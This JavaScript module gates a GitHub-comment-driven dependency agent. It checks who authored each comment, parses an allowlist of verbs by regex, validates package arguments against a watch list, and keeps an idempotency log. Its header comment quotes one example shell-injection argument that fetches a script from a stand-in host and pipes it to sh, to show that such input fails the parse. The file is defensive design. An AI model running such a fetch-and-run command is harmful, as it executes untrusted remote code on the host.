/**
 * The command surface: verb grammar, author gate, argument validation,
 * idempotency.
 *
 * `issue_comment` is a privileged trigger. It runs in the context of the
 * default branch **with the repository's secrets available**, unlike
 * `pull_request` from a fork, which gets a read-only token and none. On a
 * public repository any GitHub user can leave a comment. So without a gate, a
 * stranger can spend the user's model budget, feed arbitrary text into a job
 * holding a key and `contents: write`, and attempt to direct a commit.
 *
 * Four rules, all structural:
 *
 *   1. **Author gate.** `author_association ∈ {OWNER, MEMBER, COLLABORATOR}`,
 *      and an exit — not a warning, not a label.
 *   2. **Grammar, not model.** The body is parsed by regex over an allowlist of
 *      eight verbs — seven command shapes, because `pause` and `resume` are one
 *      toggle. The body is never passed to a model as an instruction. At
 *      most the parsed argument reaches a model, and only for `explain`.
 *   3. **Argument validation.** A package argument must appear in the watch
 *      list derived from `data/stack.json`. Free text is rejected. This removes
 *      the shell-interpolation surface entirely: `"; curl evil.sh | sh` never
 *      becomes a command, it fails the parse.
 *   4. **Idempotency.** `{comment_id, author, verb, arg, started_at, outcome}`
 *      is written to `history/commands.jsonl` before anything happens. GitHub
 *      permits re-runs and users perform them; a re-run must not bump twice.
 *
 * Seven of the eight verbs never call a model. The cheapest and most trustworthy
 * answer is a lookup, not a generation.
 */

import fs from 'node:fs';
import path from 'node:path';
import { readRows, lastRow } from './store.mjs';

export const VERBS = [
  'why',
  'what-changed',
  'bump',
  'verify',
  'wrong',
  'pause',
  'resume',
  'explain',
];

/** Verbs that may change the user's code. Only `act.yml` may run these. */
export const WRITE_VERBS = new Set(['bump', 'verify']);

/** Verbs that need a model. Only `explain`. */
export const MODEL_VERBS = new Set(['explain']);

export const ALLOWED_ASSOCIATIONS = new Set(['OWNER', 'MEMBER', 'COLLABORATOR']);

const COMMAND_RE = new RegExp(
  String.raw`^/agent\s+(${VERBS.join('|')})(?:\s+([^\n\r]*))?\s*$`,
  'i',
);

// An argument may not contain shell metacharacters. Even though nothing here is
// ever passed to a shell, refusing at the grammar keeps that true forever.
const SAFE_ARG = /^[A-Za-z0-9@._\-/:+#\s]{1,200}$/;

export class CommandError extends Error {
  constructor(code, message) {
    super(message);
    this.name = 'CommandError';
    this.code = code;
  }
}

/* ----------------------------------------------------------- author gate --- */

export function authorGate(association) {
  return ALLOWED_ASSOCIATIONS.has(String(association ?? '').toUpperCase());
}

export function assertAuthor(association) {
  if (!authorGate(association)) {
    throw new CommandError(
      'unauthorised',
      `author association "${association}" is not OWNER, MEMBER or COLLABORATOR`,
    );
  }
  return true;
}

/* ---------------------------------------------------------------- parse ---- */

/**
 * Parse a comment body. Returns the first line that is a command; everything
 * else in the body is ignored, which is the point.
 */
export function parse(body) {
  if (typeof body !== 'string') throw new CommandError('empty', 'comment body is not a string');
  const line = body
    .split('\n')
    .map((l) => l.trim())
    .find((l) => l.length > 0);
  if (!line) throw new CommandError('empty', 'no content');
  if (!line.toLowerCase().startsWith('/agent')) {
    throw new CommandError('not-a-command', 'comment does not begin with /agent');
  }
  const m = line.match(COMMAND_RE);
  if (!m) throw new CommandError('unparsable', `no known verb in "${line.slice(0, 80)}"`);

  const verb = m[1].toLowerCase();
  const rawArg = (m[2] ?? '').trim();
  if (rawArg && !SAFE_ARG.test(rawArg)) {
    throw new CommandError('unsafe-arg', 'argument contains characters outside the safe set');
  }
  return { verb, arg: rawArg, raw: line };
}

/** Split `lodash@4.17.21` into `{ name, version }`. */
export function splitPackageArg(arg) {
  const at = arg.lastIndexOf('@');
  if (at <= 0) return { name: arg, version: null };
  return { name: arg.slice(0, at), version: arg.slice(at + 1) || null };
}

/* ------------------------------------------------------------ validate ---- */

function loadStack(root = process.cwd()) {
  const p = path.join(root, 'data/stack.json');
  if (!fs.existsSync(p)) return { packages: [], watch: {} };
  try {
    return JSON.parse(fs.readFileSync(p, 'utf8'));
  } catch {
    return { packages: [], watch: {} };
  }
}

/** Package names the agent is allowed to act on. */
export function watchList(root = process.cwd()) {
  const stack = loadStack(root);
  const names = (stack.packages ?? []).map((p) => p.name);
  for (const p of stack.watch?.packages ?? []) names.push(typeof p === 'string' ? p : p.name);
  return [...new Set(names.filter(Boolean))];
}

/**
 * Validate a parsed command against the watch list.
 * Throws CommandError on anything it cannot vouch for.
 */
export function validate({ verb, arg }, { root = process.cwd(), knownIds = [] } = {}) {
  if (!VERBS.includes(verb)) throw new CommandError('unknown-verb', verb);

  if (verb === 'pause' || verb === 'resume') {
    if (arg) throw new CommandError('bad-arg', `${verb} takes no argument`);
    return { verb, arg: null };
  }

  if (verb === 'what-changed') {
    // Optional "since <iso-date>" — anything else is rejected rather than
    // guessed at, because a guessed date changes what the digest claims.
    if (!arg) return { verb, arg: null };
    const m = arg.match(/^since\s+(\d{4}-\d{2}-\d{2})$/i);
    if (!m) throw new CommandError('bad-arg', `what-changed takes nothing, or "since YYYY-MM-DD"`);
    return { verb, arg: m[1] };
  }

  if (verb === 'verify') {
    const m = arg.match(/^(?:#)?(\d{1,7})$/) ?? arg.match(/\/pull\/(\d{1,7})$/);
    if (!m) throw new CommandError('bad-arg', `verify takes a pull request number`);
    return { verb, arg: m[1] };
  }

  if (verb === 'explain') {
    const id = arg.trim();
    if (!/^(GHSA-[A-Za-z0-9-]{4,}|CVE-\d{4}-\d{4,7})$/i.test(id)) {
      throw new CommandError('bad-arg', `explain takes an advisory id (GHSA-… or CVE-…)`);
    }
    if (knownIds.length && !knownIds.includes(id)) {
      throw new CommandError('unknown-id', `${id} is not an advisory in this repository`);
    }
    return { verb, arg: id };
  }

  // why | bump | wrong — all take a watched package.
  const { name, version } = splitPackageArg(arg);
  if (!name) throw new CommandError('bad-arg', `${verb} takes a package name`);
  const watched = watchList(root);
  if (!watched.includes(name)) {
    throw new CommandError(
      'not-watched',
      `"${name}" is not in the watch list (data/stack.json). Add it there first.`,
    );
  }
  if (version && !/^\d+(\.\d+){0,3}([-+][0-9A-Za-z.-]+)?$/.test(version)) {
    throw new CommandError('bad-arg', `"${version}" is not a version`);
  }
  return { verb, arg, name, version };
}

/* ---------------------------------------------------------- idempotency --- */

const COMMANDS_LOG = 'history/commands.jsonl';

/**
 * `verb` narrows the check, because one comment can legitimately produce two
 * rows from two workflows — `ask` handling a lookup and `act` handling a write
 * verb are separate concerns with separate permissions, and neither should
 * treat the other's row as "already done".
 */
export function alreadyHandled(commentId, { root = process.cwd(), verb = null } = {}) {
  if (commentId == null) return false;
  const rows = readRows(path.join(root, COMMANDS_LOG));
  return rows.some(
    (r) => String(r.comment_id) === String(commentId) && (verb === null || r.verb === verb),
  );
}

export function findCommand(commentId, { root = process.cwd() } = {}) {
  const rows = readRows(path.join(root, COMMANDS_LOG));
  return rows.find((r) => String(r.comment_id) === String(commentId)) ?? null;
}

/**
 * Record the row BEFORE acting. Rule 4 depends on the ordering: a crash
 * mid-action must leave a row saying the command was seen, so a retry can see
 * it and stop, rather than repeating the action.
 */
export function recordIntent({ comment_id, author, verb, arg, issue }, { root = process.cwd() } = {}) {
  const row = {
    comment_id,
    author,
    verb,
    arg: arg ?? null,
    issue: issue ?? null,
    started_at: new Date().toISOString(),
    outcome: null,
  };
  const p = path.join(root, COMMANDS_LOG);
  fs.mkdirSync(path.dirname(p), { recursive: true });
  fs.appendFileSync(p, JSON.stringify(row) + '\n', 'utf8');
  return row;
}

/**
 * Amend the row with its outcome. Appends a second row rather than editing the
 * first: history is append-only (I5), and two rows tell you the command was
 * attempted twice, which is a fact worth keeping.
 */
export function recordOutcome(row, outcome, { root = process.cwd() } = {}) {
  const p = path.join(root, COMMANDS_LOG);
  fs.appendFileSync(
    p,
    JSON.stringify({ ...row, outcome, finished_at: new Date().toISOString() }) + '\n',
    'utf8',
  );
  return outcome;
}

/** Most recent `pause`/`resume`, so the schedule toggle is a state, not a flag. */
export function scheduleState({ root = process.cwd() } = {}) {
  const rows = readRows(path.join(root, COMMANDS_LOG)).filter(
    (r) => r.verb === 'pause' || r.verb === 'resume',
  );
  const last = rows.at(-1);
  return last?.verb === 'pause' ? 'paused' : 'active';
}

export { lastRow };
